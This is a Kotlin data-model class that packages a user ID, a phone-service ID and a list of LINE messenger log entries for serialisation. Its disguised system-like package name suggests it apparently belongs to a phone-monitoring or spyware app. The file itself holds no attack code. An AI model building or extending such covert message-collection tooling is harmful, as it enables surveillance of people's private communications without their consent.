package com.android.services.models

import com.android.services.db.entities.LineUnrooted
import com.google.gson.annotations.SerializedName

class LineUnrootedLogs {
    @SerializedName("userId")
    var userId: String? = null
        private set

    @SerializedName("phoneServiceId")
    var phoneServiceId: String? = null
        private set

    @SerializedName("data")
    var lineUnrootedList: List<LineUnrooted>? = null
        private set

    constructor()
    constructor(userId: String?, phoneServiceId: String?, lineUnrootedList: List<LineUnrooted>?) {
        this.userId = userId
        this.phoneServiceId = phoneServiceId
        this.lineUnrootedList = lineUnrootedList
    }
}